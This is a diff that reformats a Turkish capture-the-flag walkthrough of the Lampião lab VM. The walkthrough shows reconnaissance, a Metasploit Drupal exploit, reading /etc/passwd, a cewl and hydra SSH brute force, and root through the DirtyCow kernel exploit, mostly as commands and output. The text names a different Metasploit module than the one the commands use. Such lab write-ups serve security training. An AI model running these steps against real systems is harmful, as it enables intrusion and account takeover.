@@ -10,10 +10,10 @@ Makineyi indirdikten sonra virtualbox ile açabiliriz. Ardından network adapter
 
 Kali ve Parrot da kurulu olarak gelen `nediscover` aracı ile ağdaki cihazları tespit edebilirsiniz.
 
-```
+```text
 ┌─[✗]─[hatsat@HATSAT]─[~]
 └──╼ $sudo netdiscover
- 172.16.0.177    08:00:27:3e:b2:97      2      84  PCS Systemtechnik GmbH 
+ 172.16.0.177    08:00:27:3e:b2:97      2      84  PCS Systemtechnik GmbH
 ```
 
 Benim bağlı olduğum ağda çok fazla cihaz olduğu ve güvenlik gerekçesi ile diğer cihazların kayıtlarını sildim. Çıktı yukarıdakine benzer bi şey olacak. Mac adresi farklı olabilir, sorun yok. Artık IP adresini bildiğimize göre sıradaki aşamaya geçebiliriz.
@@ -22,7 +22,7 @@ Benim bağlı olduğum ağda çok fazla cihaz olduğu ve güvenlik gerekçesi il
 
 Namp yada zenmap kullanarak tarama yapalım.
 
-```
+```text
 ┌─[✗]─[hatsat@HATSAT]─[~]
 └──╼ $sudo nmap -sS -sV -A -p- 172.16.0.177
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-11 19:30 +03
@@ -31,29 +31,29 @@ Host is up (0.00073s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
 |   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
 |   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
 |_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
 80/tcp   open  http?
-| fingerprint-strings: 
-|   NULL: 
-|     _____ _ _ 
-|     |_|/ ___ ___ __ _ ___ _ _ 
-|     \x20| __/ (_| __ \x20|_| |_ 
-|     ___/ __| |___/ ___|__,_|___/__, ( ) 
-|     |___/ 
-|     ______ _ _ _ 
+| fingerprint-strings:
+|   NULL:
+|     _____ _ _
+|     |_|/ ___ ___ __ _ ___ _ _
+|     \x20| __/ (_| __ \x20|_| |_
+|     ___/ __| |___/ ___|__,_|___/__, ( )
+|     |___/
+|     ______ _ _ _
 |     ___(_) | | | |
 |     \x20/ _` | / _ / _` | | | |/ _` | |
 |_    __,_|__,_|_| |_|
 1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
 |_http-generator: Drupal 7 (http://drupal.org)
 | http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
 |_/LICENSE.txt /MAINTAINERS.txt
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: Lampi\xC3\xA3o
@@ -117,13 +117,14 @@ Nmap done: 1 IP address (1 host up) scanned in 43.52 seconds
 ```
 
 taramanın çıktısı buna benzer bi şey olması gerekiyor. Parametreler ise:
+
 * `-sS` service scan
 * `-sV` version scan
 * `-p-` tür portları tara
 * `-A` script, OS, version detection, traceroute taramalarının kısaltılmış yazımı
 
-
 Çıktıyı incelediğimizde üç tane port açık olduğunu görüyoruz.
+
 * `22` ssh
 * `80` http
 * `1898` http
@@ -136,12 +137,12 @@ Artık portları ve hizmetleri de biliyoruz.
 
 80 portundan açtığımızda basit bi web sayfasından başka bi şey çıkmıyor. `dirb` ile tarama yaptığımdada bi şey çıkmadı ve hata verdi. O zaman diğer porta geçelim.
 
-```
+```text
 ┌─[✗]─[hatsat@HATSAT]─[~]
 └──╼ $dirb http://172.16.0.177/
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -151,27 +152,26 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://172.16.0.177/ ----
-                                                                               
+
 (!) FATAL: Too many errors connecting to host
     (Possible cause: OK)
-                                                                               
+
 -----------------
 END_TIME: Sun Nov 11 19:40:52 2018
 DOWNLOADED: 0 - FOUND: 0
 ```
 
-
 1898 portundan girdiğimizde ise bir web sayfası karşımıza çıkıyor. Drupal ile yapılmış. Siteyi sayfa sayfa dolaşıp kaynak kodu inceledikten sonra bi şey bulamadım (Eğer bulan arkadaş olduysa yorumda belirtirlerse sevinirim). `dirb` ile taradıktan ve sonuçlardan bi kaç dizini dolaştıktan sonra buradan bi şey çıkmayacağını anladım ve yöntem değiştirmeye karar verdim. `dirb` taramasının sonucu aşağıda.
 
-```
+```text
 ┌─[✗]─[hatsat@HATSAT]─[~]
 └──╼ $dirb http://172.16.0.177:1898/
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -181,50 +181,50 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://172.16.0.177:1898/ ----
-==> DIRECTORY: http://172.16.0.177:1898/includes/                                           
-+ http://172.16.0.177:1898/index.php (CODE:200|SIZE:11400)                                  
-==> DIRECTORY: http://172.16.0.177:1898/misc/                                               
-==> DIRECTORY: http://172.16.0.177:1898/modules/                                            
-==> DIRECTORY: http://172.16.0.177:1898/profiles/                                           
-+ http://172.16.0.177:1898/robots.txt (CODE:200|SIZE:2189)                                  
-==> DIRECTORY: http://172.16.0.177:1898/scripts/                                            
-+ http://172.16.0.177:1898/server-status (CODE:403|SIZE:294)                                
-==> DIRECTORY: http://172.16.0.177:1898/sites/                                              
-==> DIRECTORY: http://172.16.0.177:1898/themes/                                             
-+ http://172.16.0.177:1898/web.config (CODE:200|SIZE:2200)                                  
-+ http://172.16.0.177:1898/xmlrpc.php (CODE:200|SIZE:42)                                    
-                                                                                            
+==> DIRECTORY: http://172.16.0.177:1898/includes/
++ http://172.16.0.177:1898/index.php (CODE:200|SIZE:11400)
+==> DIRECTORY: http://172.16.0.177:1898/misc/
+==> DIRECTORY: http://172.16.0.177:1898/modules/
+==> DIRECTORY: http://172.16.0.177:1898/profiles/
++ http://172.16.0.177:1898/robots.txt (CODE:200|SIZE:2189)
+==> DIRECTORY: http://172.16.0.177:1898/scripts/
++ http://172.16.0.177:1898/server-status (CODE:403|SIZE:294)
+==> DIRECTORY: http://172.16.0.177:1898/sites/
+==> DIRECTORY: http://172.16.0.177:1898/themes/
++ http://172.16.0.177:1898/web.config (CODE:200|SIZE:2200)
++ http://172.16.0.177:1898/xmlrpc.php (CODE:200|SIZE:42)
+
 ---- Entering directory: http://172.16.0.177:1898/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/misc/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/modules/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/profiles/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/scripts/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/sites/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                            
+
 ---- Entering directory: http://172.16.0.177:1898/themes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                               
+
 -----------------
 END_TIME: Sun Nov 11 19:45:39 2018
 DOWNLOADED: 4612 - FOUND: 5
@@ -236,10 +236,10 @@ DOWNLOADED: 4612 - FOUND: 5
 
 İnterneten araştırma yaparken drupal için exploit ile ilgili bi yazı gördüm. Bende metasploit üzerinde bi arama yaparak drupal için exploit buldum.
 
-```
+```text
 ┌─[root@HATSAT]─[/home/hatsat]
-└──╼ #msfconsole 
-                                                  
+└──╼ #msfconsole
+
 
                  _---------.
              .' #######   ;."
@@ -279,11 +279,11 @@ Matching Modules
    exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
 ```
 
-`   exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution` isimli exploiti kullanarak sisteme girebiliriz.
+`exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution` isimli exploiti kullanarak sisteme girebiliriz.
 
 `use` komutu ile exploiti seçelim. Ardından `set` komutu ile `RHOST` ve `RPORT` parameterlerine gerekli değerleri atayalım. Burada IP adresi sizde farıklı olabilir. Sizdeki IP adresini girmelisiniz. Ardından `exploit` diyerek exploiti çalıştırabiliriz.
 
-```
+```text
 use exploit/unix/webapp/drupal_drupalgeddon2
 show options
 set RHOST 172.16.0.177
@@ -292,7 +292,8 @@ exploit
 ```
 
 Ardından `meterpreter` açılacak. Yardım için `help` komutunu girebilirsiniz. Ben `shell` komutu ile shell aldım. Biraz dizinlerde dolaştıktan bazı dosyaları inceledikten sonra `/etc/passwd` dosyasına baktım. Çıktı şu şekilde olacak:
-```
+
+```text
 cat /etc/passwd
 tiago:x:1000:1000:tiago,,,:/home/tiago:/bin/bash
 sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
@@ -325,23 +326,23 @@ Dosyayı incelediğimizde `tiago` kullanıcısını görüyoruz. uid si ise 1000
 
 Onlarca başarısız deneme ve bolca uğraşdan sonra sonunda cevabı buldum. `cewl` aracı. Bu araç web sayfası üzerinden wordlist oluşturmaya yarıyor. O zaman `cewl` ile worlist oluşturalım :)
 
-```
+```text
 cewl -d 3 -m 5 http://172.16.0.177:1898/ -w cewl_pass_tiago.txt
 ```
 
 Parametreler şu şekilde:
+
 * `-d` derinlik demek. Yani web sitesinde ne kadar derine gidecek.
 * `-m` minimum uzunluk demek. En kısa parola uzunluğu.
 * `-w` çıktının kaydedileceği dosya.
 
 Bu dosyayı kullanaraş bruteforce yöntemi ile şifreyi kırmayı deneyebiliriz. Şansımız yaver giderse ...
 
-
 Sıra geldi `hydra` ile ssh şifresi kırmaya. `hydra` gelişmiş bi şifre kırma aracıdır. Kali ve parrot da kurulu olarak gelir. Programı şu şekilde kullanabiliriz.
 
-```
+```text
 ┌─[✗]─[root@HATSAT]─[/home/hatsat/TMP]
-└──╼ #hydra 172.16.0.177 ssh -l tiago -P cewl_pass_tiago.txt 
+└──╼ #hydra 172.16.0.177 ssh -l tiago -P cewl_pass_tiago.txt
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-11 17:59:10
@@ -357,6 +358,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-11 17:59:28
 ```
 
 Parametreler:
+
 * `ssh` kullanılan protokol.
 * `-l` kullanıcının ismi. Bu örnekte `tiago`
 * `-P` wordlist. cewl ile oluşturduğumuz wordlist.
@@ -367,10 +369,10 @@ Bu komut ile parolayı bulduk. Parola: `Virgulino`
 
 Bu bilgiler ile SSH ile sisteme login olabiliriz. `ssh tiago@172.16.0.177` komutu ile. Şu anda sistemdeyiz fakat henüz root değiliz.
 
-```
+```text
 ┌─[hatsat@HATSAT]─[~]
 └──╼ $ssh tiago@172.16.0.177
-tiago@172.16.0.177's password: 
+tiago@172.16.0.177's password:
 Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
 
  * Documentation:  https://help.ubuntu.com/
@@ -389,30 +391,30 @@ New release '16.04.5 LTS' available.
 Run 'do-release-upgrade' to upgrade to it.
 
 Last login: Sun Nov 11 18:15:51 2018 from 172.16.0.106
-tiago@lampiao:~$ 
+tiago@lampiao:~$
 ```
 
 Birkaç başarısız deneme ve araştırmadan sonra tekrar exploit arayışına girdim. Sistemin kernel sürümüne uygun bi exploit buldum. Kernel sürümünü şu şekilde öğrenebilirsiniz.
 
-```
+```text
 tiago@lampiao:~$ uname -a
 Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 ```
 
 `4.4.0-31-generic` kernel sürümü için exploit ararken [buradaki](https://www.exploit-db.com/exploits/40847/) exploiti buldum. Ardından `scp` komutu ile bu exploiti sunucuya yükleyip çalıştırabiliriz.
 
-```
+```text
 ┌─[✗]─[hatsat@HATSAT]─[~/Downloads]
 └──╼ $scp 40847.cpp  tiago@172.16.0.177:~
-tiago@172.16.0.177's password: 
+tiago@172.16.0.177's password:
 40847.cpp                                                  100%   10KB  14.8MB/s   00:00
 ```
 
 Şimdi derleyip çalıştıralım.
 
-```
+```text
 tiago@lampiao:~$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
-tiago@lampiao:~$ ./dcow 
+tiago@lampiao:~$ ./dcow
 Running ...
 Received su prompt (Password: )
 Root password is:   dirtyCowFun
@@ -421,20 +423,21 @@ Enjoy! :-)
 
 Ve artık root parolası elimizde. Parola: `dirtyCowFun`
 
-```
+```text
 tiago@lampiao:~$ su
-Password: 
-root@lampiao:/home/tiago# 
+Password:
+root@lampiao:/home/tiago#
 ```
 
 Şimdi root dizinindeki flag dosyasını okuyabiliriz.
 
-```
-root@lampiao:~# cat /root/flag.txt 
+```text
+root@lampiao:~# cat /root/flag.txt
 9740616875908d91ddcdaa8aea3af366
 ```
 
 Bu makine boyunca araştırdığım konular şu şekilde.
+
 * metasploit
 * meterpreter
 * hydra
